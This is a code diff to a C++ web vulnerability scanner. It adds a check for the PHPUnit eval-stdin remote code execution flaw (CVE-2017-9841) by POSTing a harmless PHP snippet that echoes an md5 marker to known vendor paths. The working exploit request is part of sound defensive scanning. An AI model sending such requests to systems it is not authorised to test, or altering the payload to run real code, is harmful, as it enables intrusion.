@@ -45,13 +45,15 @@ std::vector<Finding> check_http_methods(Stream& stream,
                                         const std::string& user_agent);
 
 // Content-level probes for web applications: GraphQL introspection, Spring
-// Boot actuator, API documentation, application manifests, and a bounded
+// Boot actuator, API documentation, application manifests, PHPUnit eval-stdin
+// RCE (POST, opt-out with allow_post=false in --safe), and a bounded
 // single-quote probe of search endpoints with strict database-error markers.
 template <typename Stream>
 std::vector<Finding> check_webapp_probes(Stream& stream,
                                          const std::string& host,
                                          uint16_t port, int timeout_ms,
-                                         const std::string& user_agent);
+                                         const std::string& user_agent,
+                                         bool allow_post = true);
 
 // Testable classifiers used by check_webapp_probes.
 bool looks_like_sql_error(const std::string& body);
@@ -71,6 +73,9 @@ inline Finding make_finding(const std::string& host, uint16_t port,
     f.description = description;
     f.evidence = evidence;
     f.source = "builtin";
+    // Built-in checks report observed responses only, never version guesses.
+    f.verified = true;
+    f.confidence = "confirmed";
     return f;
 }
 
@@ -213,7 +218,8 @@ template <typename Stream>
 std::vector<Finding> check_webapp_probes(Stream& stream,
                                          const std::string& host,
                                          uint16_t port, int timeout_ms,
-                                         const std::string& user_agent) {
+                                         const std::string& user_agent,
+                                         bool allow_post) {
     std::vector<Finding> out;
     auto add = [&](const std::string& title, Severity sev,
                    const std::string& description,
@@ -294,6 +300,39 @@ std::vector<Finding> check_webapp_probes(Stream& stream,
             "application and its dependency versions — a dependency lookup "
             "produces a targeted CVE list.",
             "GET /package.json -> 200");
+    }
+
+    // PHPUnit eval-stdin RCE (CVE-2017-9841): the script evaluates the raw
+    // POST body as PHP. The payload only echoes an md5 constant, so a hit is
+    // remote-code-execution proof while staying read-only. POST -> skipped
+    // in --safe mode.
+    if (allow_post) {
+        static const char* eval_paths[] = {
+            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+            "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/",
+        };
+        const std::string marker = "05f43fed0e82268cba041a6b303c81f7"; // md5('sleipnir')
+        HttpOptions php_opts;
+        php_opts.body = "<?php echo(md5('sleipnir')); ?>";
+        php_opts.content_type = "text/html";
+        for (const char* ep : eval_paths) {
+            auto resp = http_request_ex(stream, "POST", host, port, ep,
+                                        timeout_ms, user_agent, php_opts);
+            if (!resp || resp->body.find(marker) == std::string::npos)
+                continue;
+            out.push_back(detail::make_finding(
+                host, port,
+                "PHPUnit eval-stdin.php exposed (CVE-2017-9841)",
+                Severity::Critical,
+                "The PHPUnit eval-stdin.php script is reachable and executes "
+                "the raw request body as PHP code — unauthenticated remote "
+                "code execution. Remove vendor test files from the deployed "
+                "web root.",
+                "POST " + std::string(ep) + " with <?php echo(md5('sleipnir')); "
+                "?> -> md5 marker returned"));
+            break;
+        }
     }
 
     // Bounded SQL-injection probe: quote-only payloads against typical search
